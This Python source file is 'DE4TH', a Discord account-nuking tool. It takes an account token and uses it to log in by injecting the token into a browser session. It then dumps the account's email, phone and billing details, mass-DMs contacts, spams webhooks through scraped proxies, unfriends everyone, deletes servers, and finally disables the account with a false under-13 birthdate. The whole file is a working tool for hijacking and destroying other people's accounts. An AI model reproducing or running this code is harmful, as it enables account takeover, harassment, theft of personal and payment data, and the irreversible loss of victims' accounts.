# Basic Imports
import os
import time
import requests
import json
import threading
import random
from colorama import Fore as F
from datetime import datetime
from selenium import webdriver
from msvcrt import kbhit

# Utility Functions
def centure(var, space = None):
    if not space:
        space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2
    
    return "\n".join((' ' * int(space)) + var for var in var.splitlines())

def slow(text, speed = 0.02, newLine = False):
    for i in text:
        print(i, end = "", flush = True)
        time.sleep(speed)
    print()
    if newLine:
        print()

def proxy_scrape():
    startTime = time.time()
    temp = os.getenv("temp")+"\\proxies.txt"
    print(f"{F.YELLOW}Scraping proxies!")
    r = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=8500&country=all&ssl=all&anonymity=elite&simplified=true", headers={'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'})
    with open(temp, "wb") as f:
        f.write(r.content)
    execution_time = (time.time() - startTime)
    slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Done scraping proxies!  > {temp}{F.RESET} | {F.LIGHTBLACK_EX+execution_time}ms')
    print(f"{F.GREEN}Done scraping proxies => {temp}{F.RESET} | {execution_time}ms")
    f.close()

def write_json(data, fileName = 'de4th.json'):
    with open(fileName, 'w') as f:
        json.dump(data, f, indent=4)
        f.close()

def proxy():
    temp = os.getenv("temp")+"\\proxies.txt"
    if not os.path.exists(temp):
        with open(temp, "w") as f:
            f.close()
    if os.stat(temp).st_size == 0:
        proxy_scrape()
    proxies = open(temp).read().split('\n')
    proxy = proxies[1]

    with open(temp, 'r+') as fp:
        lines = fp.readlines()
        fp.seek(0)
        fp.truncate()
        fp.writelines(lines[1:])
    return proxy


try:
    f = open('de4th.json', 'r')
    f.close()
except:
    webdata = {
        'WEBHOOK_MESSAGE': 'MESSAGE HERE',
        'WEBHOOK_USERNAME': 'WEBHOOK USERNAME HERE',
        'WEBHOOK_AVATAR_URL': 'WEBHOOK AVATAR URL HERE',
        'embeds': [
            {
                "title": "This is the title",
                "description": "Please use https://discohook.org/ to make an embed! Please only use the \"embeds\" and not \"content\" etc from there!",
                "color": 16711680
            }
        ]
    }
    write_json(webdata, 'de4th.json')

VERSION = "1.0"
ERROR_PREFIX = F.LIGHTRED_EX + '  ERROR  ' + F.RESET + ': ' + F.LIGHTBLACK_EX
skull = f"""{F.LIGHTGREEN_EX}          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'   BY:    `98v8P'    ZEV   `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '
                    
                           {F.GREEN}D E 4 T H   {F.RESET}|{F.LIGHTBLACK_EX}   V 1 . 0{F.RESET}\n"""

def main():
    os.system('cls && title DE4TH ^| By: Zev')
    print(centure(skull))
    print(f'''{F.RESET} >  {F.LIGHTCYAN_EX} 1 {F.RESET} : {F.LIGHTGREEN_EX}Login into Account                  {F.LIGHTBLACK_EX}  {F.RESET} >  {F.LIGHTCYAN_EX} 10 {F.RESET} : {F.LIGHTGREEN_EX}Nuke account
{F.RESET} >  {F.LIGHTCYAN_EX} 2 {F.RESET} : {F.LIGHTGREEN_EX}About account                       {F.LIGHTBLACK_EX}  {F.RESET} >  {F.LIGHTCYAN_EX} 11 {F.RESET} : {F.LIGHTGREEN_EX}Status changer
{F.RESET} >  {F.LIGHTCYAN_EX} 3 {F.RESET} : {F.LIGHTGREEN_EX}Webhook spammer                     {F.LIGHTBLACK_EX}  {F.RESET} >  {F.LIGHTCYAN_EX} 12 {F.RESET} : {F.LIGHTGREEN_EX}Disable Account
{F.RESET} >  {F.LIGHTCYAN_EX} 4 {F.RESET} : {F.LIGHTGREEN_EX}Unfriend everyone                   {F.LIGHTBLACK_EX}  {F.RESET} >  {F.LIGHTCYAN_EX} 13 {F.RESET} : {F.LIGHTGREEN_EX}Mass Report
{F.RESET} >  {F.LIGHTCYAN_EX} 5 {F.RESET} : {F.LIGHTGREEN_EX}Delete & Leave all servers          {F.LIGHTBLACK_EX}  {F.RESET} >  {F.LIGHTCYAN_EX} 14 {F.RESET} : {F.LIGHTGREEN_EX}Exit
{F.RESET} >  {F.LIGHTCYAN_EX} 6 {F.RESET} : {F.LIGHTGREEN_EX}Spam create servers
{F.RESET} >  {F.LIGHTCYAN_EX} 7 {F.RESET} : {F.LIGHTGREEN_EX}Delete all dms                      
{F.RESET} >  {F.LIGHTCYAN_EX} 8 {F.RESET} : {F.LIGHTGREEN_EX}Mass DM                             
{F.RESET} >  {F.LIGHTCYAN_EX} 9 {F.RESET} : {F.LIGHTGREEN_EX}Spam Light & Dark mode              {F.RESET}\n''')
    try:
        choice = int(input(f' {F.GREEN}Enter your Choice (1-18) {F.RESET}> {F.LIGHTGREEN_EX}'))
        if not choice in [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18]:
            print(ERROR_PREFIX + 'Please only type a number from 1 - 18')
    except:
        print(ERROR_PREFIX + 'Please only type a number from 1 - 18')
    
    if choice == 1:
        os.system('cls && title DE4TH ^| Account Login')
        print(centure(skull))
        token = input(f' {F.GREEN}Enter Token {F.RESET}> {F.LIGHTGREEN_EX}')
        slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Logging in...')
        login_script = '''setInterval(() => {document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.token = `"%TOKEN%"`}, 50);\nsetTimeout(() => {location.reload();}, 2500);'''.replace('%TOKEN%', token)
        options = webdriver.ChromeOptions()
        options.add_experimental_option('detach', True)
        driver = webdriver.Chrome('C:\\Program Files (x86)\\chromedriver.exe', options=options)
        driver.get('https://discord.com/login')
        driver.execute_script(login_script + f'\nlogin("{token}")')
        slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Logged in!')
        input(centure(F.LIGHTBLACK_EX + 'Press enter to restart program!'))
        main()
    elif choice == 2:
        os.system('cls && title DE4TH ^| Account Information')
        print(centure(skull))
        token = input(f' {F.GREEN}Enter Token {F.RESET}> {F.LIGHTGREEN_EX}')
        badges = []
        cc_digits = {
            'american express': '3',
            'visa': '4',
            'mastercard': '5'
        }
        Discord_Employee = 1
        Partnered_Server_Owner = 2
        HypeSquad_Events = 4
        Bug_Hunter_Level_1 = 8
        House_Bravery = 64
        House_Brilliance = 128
        House_Balance = 256
        Early_Supporter = 512
        Bug_Hunter_Level_2 = 16384
        Early_Verified_Bot_Developer = 131072
        r = requests.get(
            'https://discord.com/api/v9/users/@me',
            headers = {
                'authorization': token
            }
        )
        j = r.json()
        try:
            if r.status_code == 200:
                flags = j['flags']
                if (flags == Discord_Employee):
                    badges.append('Staff')
                if (flags == Partnered_Server_Owner):
                    badges.append('Partner')
                if (flags == HypeSquad_Events):
                    badges.append('HypeSquad Events')
                if (flags == Bug_Hunter_Level_1):
                    badges.append('Bug Hunter Level 1')
                if (flags == House_Bravery):
                    badges.append('HypeSquad Bravery')
                if (flags == House_Brilliance):
                    badges.append('HypeSquad Brilliance')
                if (flags == House_Balance):
                    badges.append('HypeSquad Balance')
                if (flags == Early_Supporter):
                    badges.append('Early Supporter')
                if (flags == Bug_Hunter_Level_2):
                    badges.append('Bug Hunter Level 2')
                if (flags == Early_Verified_Bot_Developer):
                    badges.append('Verified Bot Developer')
                if (badges == ""):
                    badges.append('None')
                username = j['username'] + '#' + j['discriminator']
                uid = j['id']
                badge = ""
                for b in badges:
                    if len(badge) == 0:
                        badge = b
                    else:
                        badge = badge + ', ' + b
                phone = j['phone']
                email = j['email']
                language = j['locale']
                mfa = j['mfa_enabled']
                verified = j['verified']
                avatar_id = j['avatar']
                try:
                    res = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers={'authorization': token})
                    nitro_data = res.json()
                    has_nitro = bool(len(nitro_data))
                except:
                    has_nitro = False
                avatar_url = f'https://cdn.discordapp.com/avatars/{uid}/{avatar_id}'
                creation_date = datetime.utcfromtimestamp(((int(uid) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
                if has_nitro:
                    d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                    d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                    days_left = abs((d2 - d1).days)
                billing_info = []
                for x in requests.get('https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers={'authorization':token}).json():
                    y = x['billing_address']
                    name = y['name']
                    address_1 = y['line_1']
                    address_2 = y['line_2']
                    city = y['city']
                    postal_code = y['postal_code']
                    state = y['state']
                    country = y['country']
                    if x['type'] == 1:
                        cc_brand = x['brand']
                        cc_first = cc_digits.get(cc_brand)
                        cc_last = x['last_4']
                        cc_month = str(x['expires_month'])
                        cc_year = str(x['expires_year'])
                        data = {
                            'Payment Type': 'Credit Card',
                            'Valid': not x['invalid'],
                            'CC Holder Name': name,
                            'CC Brand': cc_brand.title(),
                            'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
                            'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
                            'Address 1': address_1,
                            'Address 2': address_2 if address_2 else '',
                            'City': city,
                            'Postal Code': postal_code,
                            'State': state if state else '',
                            'Country': country,
                            'Default Payment': x['default']
                        }
                    elif x['type'] == 2:
                        data = {
                            'Payment Type': 'PayPal',
                            'Valid': not x['invalid'],
                            'PayPal Name': name,
                            'PayPal Email': x['email'],
                            'Address 1': address_1,
                            'Address 2': address_2 if address_2 else '',
                            'City': city,
                            'Postal Code': postal_code,
                            'State': state if state else '',
                            'Country': country,
                            'Default Payment': x['default']
                        }
                    billing_info.append(data)
                print(f'''
{F.RESET}          >>  {F.LIGHTBLACK_EX}    --    {F.CYAN + username + F.LIGHTBLACK_EX}    --      {F.RESET}<<
{F.RESET} > {F.LIGHTCYAN_EX}UserId                        {F.RESET}|{F.LIGHTGREEN_EX}  {uid}
{F.RESET} > {F.LIGHTCYAN_EX}Created at                    {F.RESET}|{F.LIGHTGREEN_EX}  {creation_date}
{F.RESET} > {F.LIGHTCYAN_EX}Language                      {F.RESET}|{F.LIGHTGREEN_EX}  {language}
{F.RESET} > {F.LIGHTCYAN_EX}Badges                        {F.RESET}|{F.LIGHTGREEN_EX}  {badge}
{F.RESET} > {F.LIGHTCYAN_EX}Avatar URL                    {F.RESET}|{F.LIGHTGREEN_EX}  {avatar_url}
{F.RESET}          >>  {F.LIGHTBLACK_EX}    --    {F.CYAN + 'Security Info' + F.LIGHTBLACK_EX}    --      {F.RESET}<<
{F.RESET} > {F.LIGHTCYAN_EX}Email                         {F.RESET}|{F.LIGHTGREEN_EX}  {email}
{F.RESET} > {F.LIGHTCYAN_EX}Email Verified                {F.RESET}|{F.LIGHTGREEN_EX}  {verified}
{F.RESET} > {F.LIGHTCYAN_EX}2 Factor Authentication       {F.RESET}|{F.LIGHTGREEN_EX}  {mfa}
{F.RESET} > {F.LIGHTCYAN_EX}Phone Number                  {F.RESET}|{F.LIGHTGREEN_EX}  {phone if phone else "None"}
{F.RESET}          >>  {F.LIGHTBLACK_EX}    --    {F.CYAN + 'Nitro Status' + F.LIGHTBLACK_EX}    --      {F.RESET}<<
{F.RESET} > {F.LIGHTCYAN_EX}Nitro                         {F.RESET}|{F.LIGHTGREEN_EX}  {has_nitro}
{F.RESET} > {F.LIGHTCYAN_EX}Expires in                    {F.RESET}|{F.LIGHTGREEN_EX}  {days_left if has_nitro else "0"} day(s)''')
                if len(billing_info) > 0:
                    print(f'{F.RESET}          >>  {F.LIGHTBLACK_EX}    --    {F.CYAN}Billing Information{F.LIGHTBLACK_EX}    --      {F.RESET}<<')
                    if len(billing_info) == 1:
                        for x in billing_info:
                            for key, val in x.items():
                                if not val:
                                    continue
                                print(f"        [{F.RED}"+'{:<23}{:<10}{}'.format(key+F.RED+F.RESET+"]", F.RESET, val))
                    else:
                        for i, x in enumerate(billing_info):
                            title = f'Payment Method #{i + 1} ({x["Payment Type"]})'
                            print(F.LIGHTBLACK_EX + '  ' + title)
                            for j, (key, val) in enumerate(x.items()):
                                if not val or j == 0:
                                    continue
                                print(f"{F.RESET} > {F.LIGHTCYAN_EX}"+'{:<23}{:<10}{}'.format(key+F.LIGHTCYAN_EX+F.RESET+"", F.RESET, val))
                            if i < len(billing_info) - 1:
                                print(f'{F.RESET}\n')
                    print(f'{F.RESET}')
            else:
                print(ERROR_PREFIX + 'Invalid token!')
        except Exception as e:
            print(ERROR_PREFIX + 'Caught an error! ' + e)
    elif choice == 3:
        os.system('cls && title DE4TH ^| Webhook Spammer')
        print(centure(skull))
        webhook = input(f' {F.GREEN}Enter Webhook URL {F.RESET}> {F.LIGHTGREEN_EX}')
        c = 0
        try:
            times = int(input(f' {F.GREEN}How many would you like to spam? {F.RESET}> {F.LIGHTGREEN_EX}'))
            if times < 1:
                times = 1
            elif times > 1500:
                times = 1500
            slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Please edit config.json and press Enter when done!\n')
            input()
            file = open('de4th.json', 'r')
            data = json.load(file)
            user = data["WEBHOOK_USERNAME"]
            avatar_url = data["WEBHOOK_AVATAR_URL"]
            msg = data["WEBHOOK_MESSAGE"]
            embeds = data["embeds"]
            file.close()
            for i in range(times):
                c+=1
                r = requests.post(webhook, json = {'content': msg, 'username': user, 'avatar_url': avatar_url, 'embeds': embeds}, proxies={"ftp": f'{proxy()}'})
                if r.status_code in [200, 204]:
                    print(f"{F.RESET} > {F.LIGHTCYAN_EX}Sent Webhook {F.RESET}: {F.LIGHTGREEN_EX}Webhook #{i+1}"+F.RESET)
                elif r.status_code == 429:
                    print(f"{F.RESET} > {F.LIGHTYELLOW_EX}Rate Limited! {F.RESET}: {F.LIGHTGREEN_EX}Webhook #{1+i} Waiting for {r.json()['retry-after']} seconds!"+F.RESET)
                    time.sleep(int(r.json()['retry-after']))
                else:
                    print(f"{F.RESET} > {F.LIGHTCYAN_EX}Failed to send Webhook {F.RESET}: {F.LIGHTGREEN_EX}Webhook #{i+1}"+F.RESET)
            print(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Sent {c} webhooks!')
        except Exception as e:
            print(ERROR_PREFIX + "Please enter a number only! : "+e)
    elif choice == 4:
        os.system('cls && title DE4TH ^| Unfriend Everyone')
        print(centure(skull))
        token = input(f' {F.GREEN}Enter Token {F.RESET}> {F.LIGHTGREEN_EX}')
        slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Unfriending...\n')
        count = 0
        friendIds = requests.get('https://discord.com/api/v9/users/@me/relationships', proxies = {'ftp': f'{proxy()}'}, headers={'authorization': token}).json()
        for friend in friendIds:
            try:
                requests.delete(
                    f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], proxies={"ftp": f'{proxy()}'}, headers={'authorization': token}
                )
                count += 1
                print(f"{F.RESET} > {F.LIGHTCYAN_EX}Removed Friend {F.RESET}: {F.LIGHTGREEN_EX}"+friend['user']['username']+"#"+friend['user']['discriminator']+F.RESET)
            except Exception as e:
                print(ERROR_PREFIX + "An error occured! "+e)
        slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Removed {count} friends from the friend list!')
    elif choice == 6:
        os.system('cls && title DE4TH ^| Spam Create Servers')
        print(centure(skull))
        token = input(f' {F.GREEN}Enter Token {F.RESET}> {F.LIGHTGREEN_EX}')
        name = input(f' {F.GREEN}Enter name of each server {F.RESET}> {F.LIGHTGREEN_EX}')
        try:
            amount = int(input(f' {F.GREEN}Amount of servers to create (1 - 100){F.RESET}> {F.LIGHTGREEN_EX}'))
            if amount > 100:
                amount = 100
            elif amount < 1:
                amount = 1
            count = 0
            for i in range(amount):
                try:
                    payload = {
                        'name': name,
                        'region': 'europe',
                        'icon': None,
                        'channels': None
                    }
                    requests.post('https://discord.com/api/v7/guilds', proxies={"ftp": f'{proxy()}'}, headers={'authorization': token}, json=payload)
                    count += 1
                    print(f"{F.RESET} > {F.LIGHTCYAN_EX}Created Server {F.RESET}: {F.LIGHTGREEN_EX}{name} (#{i})"+F.RESET)
                except Exception as e:
                    print(ERROR_PREFIX + "An error occured: " +e)
            slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Created {count} servers with the name {name}!')
        except:
            print(ERROR_PREFIX + "Please select a number from range 1 - 100")
    elif choice == 5:
        os.system('cls && title DE4TH ^| Leave ^& Delete Servers')
        print(centure(skull))
        token = input(f' {F.GREEN}Enter Token {F.RESET}> {F.LIGHTGREEN_EX}')
        left = 0
        deleted = 0
        guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers={'authorization': token}).json()
        for guild in guildsIds:
            try:
                requests.delete(
                    f'https://discord.com/api/v8/users/@me/guilds/'+guild['id'], proxies={"ftp": f'{proxy()}'}, headers={'Authorization': token})
                left += 1
                print(f"{F.RESET} > {F.LIGHTCYAN_EX}Left Guild {F.RESET}: {F.LIGHTGREEN_EX}{guild['name']}"+F.RESET)
            except Exception as e:
                print(f"The following error has been encountered and is being ignored: {e}")

        for guild in guildsIds:
            try:
                requests.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], proxies={"ftp": f'{proxy()}'}, headers={'Authorization': token})
                deleted += 1
                print(f"{F.RESET} > {F.LIGHTCYAN_EX}Deleted Guild {F.RESET}: {F.LIGHTGREEN_EX}{guild['name']}"+F.RESET)
            except Exception as e:
                print(ERROR_PREFIX + f"The following error has been encountered and is being ignored: {e}")
        slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Left {left} guilds and deleted {deleted} guilds!')
    elif choice == 7:
        os.system('cls && title DE4TH ^| Close All DMS')
        print(centure(skull))
        token = input(f' {F.GREEN}Enter Token {F.RESET}> {F.LIGHTGREEN_EX}')
        channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers={'authorization': token}).json()
        c = 0
        for channel in channelIds:
            try:
                requests.delete(f'https://discord.com/api/v9/channels/'+channel['id'],
                    proxies={"ftp": f'{proxy()}'},
                    headers={'authorization': token}
                )
                print(f"{F.RESET} > {F.LIGHTCYAN_EX}Deleted ID {F.RESET}: {F.LIGHTGREEN_EX + channel['id']}"+F.RESET)
                c+=1
            except Exception as e:
                print(ERROR_PREFIX + "An error occured: "+e)
        slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Deleted {c} dms!')
    elif choice == 8:
        os.system('cls && title DE4TH ^| Mass DM')
        print(centure(skull))
        token = input(f' {F.GREEN}Enter Token {F.RESET}> {F.LIGHTGREEN_EX}')
        message = input(f' {F.GREEN}Enter Message {F.RESET}> {F.LIGHTGREEN_EX}')
        channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers={'authorization': token}).json()
        c = 0
        for channel in channelIds:
            try:
                requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages',
                    proxies={"ftp": f'{proxy()}'},
                    headers={'authorization': token},
                    data={"content": f"{message}"}
                )
                print(f"{F.RESET} > {F.LIGHTCYAN_EX}Messaged ID {F.RESET}: {F.LIGHTGREEN_EX + channel['id']}"+F.RESET)
                c+=1
            except Exception as e:
                print(ERROR_PREFIX + "An error occured: "+e)
        slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Send the message in {c} dms!')
    elif choice == 9:
        os.system('cls && title DE4TH ^| Spam Light & Dark mode & Languages ^| Type to quit')
        print(centure(skull))
        token = input(f' {F.GREEN}Enter Token {F.RESET}> {F.LIGHTGREEN_EX}')
        slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Starting!')
        slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Please type anything to quit!{F.RESET}', 0.04)
        cyc = 0
        while True:
            modes = random.choice(['light', 'dark'])
            setting = {
                "theme": modes,
                "locale": random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])
            }
            theme = setting["theme"]
            lang = setting["locale"]
            r = requests.patch("https://discord.com/api/v7/users/@me/settings", proxies={"ftp": f'{proxy()}'}, headers={'authorization': token}, json=setting)
            if r.status_code in [201, 200, 204]:
                print(f"{F.RESET} > {F.LIGHTCYAN_EX}Changes Made {F.RESET}: {F.LIGHTGREEN_EX}Theme: {theme} & Lang: {lang}"+F.RESET)
                cyc += 1
            if kbhit():
                break
            time.sleep(0.5)
        slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Cycled through random languages and themes {cyc} times!', 0.04)

    elif choice == 11:
        os.system('cls && title DE4TH ^| Status Changer')
        print(centure(skull))
        token = input(f' {F.GREEN}Enter Token {F.RESET}> {F.LIGHTGREEN_EX}')
        custom_status = input(f' {F.GREEN}Enter custom status {F.RESET}> {F.LIGHTGREEN_EX}')
        try:
            status = int(input(f' {F.GREEN}Enter status (1 = Online, 2 = Idle, 3 = Invisble, 4 = DnD) {F.RESET}> {F.LIGHTGREEN_EX}'))
            if not status in [1,2,3]:
                print(ERROR_PREFIX + "Please type a number from 1 - 3")
            else:
                if status == 1:
                    stat = 'online'
                elif status == 2:
                    stat = 'idle'
                elif status == 3:
                    stat = 'invisible'
                elif status == 4:
                    stat = 'dnd'
                payload = {
                    'custom_status': {'text': custom_status},
                    'status': stat
                }
                r = requests.patch('https://discord.com/api/v9/users/@me/settings', proxies={"ftp": f'{proxy()}'}, headers={'authorization': token}, json=payload)
                slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Status was changed to {stat} & custom status was changed to {custom_status}')
        except:
            print(ERROR_PREFIX + "Please type a number from 1 - 3")
    elif choice == 10:
        os.system('cls && title DE4TH ^| Account Nuker')
        print(centure(skull))
        token = input(f' {F.GREEN}Enter Token {F.RESET}> {F.LIGHTGREEN_EX}')
        uw = False
        servers_name = input(f' {F.GREEN}Enter the name of the servers that will be created {F.RESET}> {F.LIGHTGREEN_EX}')
        custo = input(f' {F.GREEN}Enter the custom status that will be set  {F.RESET}> {F.LIGHTGREEN_EX}')
        messages_name = input(f' {F.GREEN}Enter the message that will be sent to all friends  {F.RESET}> {F.LIGHTGREEN_EX}')
        use_webhook = input(f' {F.GREEN}Do you want to use embeds in the message? The embeds used in webhooks in config.json (y/n) {F.RESET}> {F.LIGHTGREEN_EX}')
        if use_webhook.lower() in ['yes', 'ye', 'y', '0', 'confirm', 'ok']:
            uw = True
        try:
            dm_times = int(input(f' {F.GREEN}DM Amount Per Person  {F.RESET}> {F.LIGHTGREEN_EX}'))
            if dm_times < 1:
                dm_times = 1
            elif dm_times > 6900:
                dm_times = 69000
        except:
            print(ERROR_PREFIX + "Please type a number!")
        confirmation = input(f'  {F.GREEN}Confirmation | Are you sure you want to nuke this account? (y/n) {F.RESET}> {F.LIGHTGREEN_EX}')
        if confirmation.lower() in ['yes', 'ye', 'y', '0', 'confirm', 'ok']:
            # Leave & Delete all guilds
            left = 0
            deleted = 0
            guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers={'authorization': token})
            if guildsIds.status_code != 404:
                for guild in guildsIds.json():
                    try:
                        requests.delete(
                            f'https://discord.com/api/v8/users/@me/guilds/'+guild['id'], proxies={"ftp": f'{proxy()}'}, headers={'Authorization': token})
                        left += 1
                        print(f"{F.RESET} > {F.LIGHTCYAN_EX}Left Guild {F.RESET}: {F.LIGHTGREEN_EX}{guild['name']}"+F.RESET)
                    except Exception as e:
                        print(f"{ERROR_PREFIX}The following error has been encountered and is being ignored: {e}")
                guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers={'authorization': token})
                for guild in guildsIds.json():
                    try:
                        requests.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], proxies={"ftp": f'{proxy()}'}, headers={'Authorization': token})
                        deleted += 1
                        print(f"{F.RESET} > {F.LIGHTCYAN_EX}Deleted Guild {F.RESET}: {F.LIGHTGREEN_EX}{guild['name']}"+F.RESET)
                    except Exception as e:
                        print(ERROR_PREFIX + f"The following error has been encountered and is being ignored: {e}")
                slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Left {left} guilds and deleted {deleted} guilds!')

                # Spam Guilds
                total_guilds=0
                for i in range(100):
                    try:
                        payload = {
                            'name': servers_name,
                            'region': 'europe',
                            'icon': None,
                            'channels': None
                        }
                        requests.post('https://discord.com/api/v7/guilds', proxies={"ftp": f'{proxy()}'}, headers={'authorization': token}, json=payload)
                        print(f"{F.RESET} > {F.LIGHTCYAN_EX}Created Server {F.RESET}: {F.LIGHTGREEN_EX}{servers_name} (#{i})"+F.RESET)
                        total_guilds += 1
                    except Exception as e:
                        print(ERROR_PREFIX + "An error occured: " +e)
                slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Created {total_guilds} servers with the name {servers_name}!')

                # Mass DM
                for i in range(dm_times):
                    slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Mass DM Round {i}/{dm_times}', 0.001)
                    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers={'authorization': token}).json()
                    c = 0
                    for channel in channelIds:
                        try:
                            requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages',
                                proxies={"ftp": f'{proxy()}'},
                                headers={'authorization': token},
                                data={"content": f"{messages_name}"}
                            )
                            print(f"{F.RESET} > {F.LIGHTCYAN_EX}Messaged ID {F.RESET}: {F.LIGHTGREEN_EX + channel['id']}"+F.RESET)
                            c+=1
                        except Exception as e:
                            print(ERROR_PREFIX + "An error occured: "+e)
                    slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Send the message in {c} dms!', 0.0007)

                # Unfriend Everyone
                slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Unfriending...\n')
                count = 0
                friendIds = requests.get('https://discord.com/api/v9/users/@me/relationships', proxies = {'ftp': f'{proxy()}'}, headers={'authorization': token}).json()
                for friend in friendIds:
                    try:
                        requests.delete(
                            f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], proxies={"ftp": f'{proxy()}'}, headers={'authorization': token}
                        )
                        count += 1
                        print(f"{F.RESET} > {F.LIGHTCYAN_EX}Removed Friend {F.RESET}: {F.LIGHTGREEN_EX}"+friend['user']['username']+"#"+friend['user']['discriminator']+F.RESET)
                    except Exception as e:
                        print(ERROR_PREFIX + "An error occured! "+e)
                slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Removed {count} friends from the friend list!')

                # Close all DMS
                channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers={'authorization': token}).json()
                c = 0
                for channel in channelIds:
                    try:
                        requests.delete(f'https://discord.com/api/v9/channels/'+channel['id'],
                            proxies={"ftp": f'{proxy()}'},
                            headers={'authorization': token}
                        )
                        print(f"{F.RESET} > {F.LIGHTCYAN_EX}Deleted ID {F.RESET}: {F.LIGHTGREEN_EX + channel['id']}"+F.RESET)
                        c+=1
                    except Exception as e:
                        print(ERROR_PREFIX + "An error occured: "+e)
                slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Deleted {c} dms!')

                # Spoof Settings
                setting = {
                    'theme': "light",
                    'locale': "ja",
                    'message_display_compact': False,
                    'inline_embed_media': False,
                    'inline_attachment_media': False,
                    'gif_auto_play': False,
                    'render_embeds': False,
                    'render_reactions': False,
                    'animate_emoji': False,
                    'convert_emoticons': False,
                    'enable_tts_command': False,
                    'explicit_content_filter': '0',
                    'status': 'online',
                    'custom_status': {'text': custo}
                }
                requests.patch("https://discord.com/api/v7/users/@me/settings", proxies={"ftp": f'{proxy()}'}, headers={'authorization': token}, json=setting)
                j = requests.get("https://discordapp.com/api/v9/users/@me", proxies={"ftp": f'{proxy()}'}, headers={'authorization': token}).json()
                a = j['username'] + "#" + j['discriminator']

                DISAa = input(f' {F.GREEN}Do you want to disable the account? (y/n) {F.RESET}> {F.LIGHTGREEN_EX}')
                if DISAa.lower() in ['yes', 'ye', 'y', '0', 'confirm', 'ok']:
                    
                    # Disable Account
                    death = requests.patch('https://discordapp.com/api/v9/users/@me', proxies={"ftp": f'{proxy()}'}, headers={'authorization': token}, json={'date_of_birth': '2014-2-11'})
                    if death.status_code == 400:
                        m = death.json().get('date_of_birth', ['no response message'])[0]
                        if m == "You need to be 13 or older in order to use Discord.":
                            slow(f'{F.GREEN} STATUS {F.RESET}: {F.LIGHTBLACK_EX}Successfully disabled the account!')
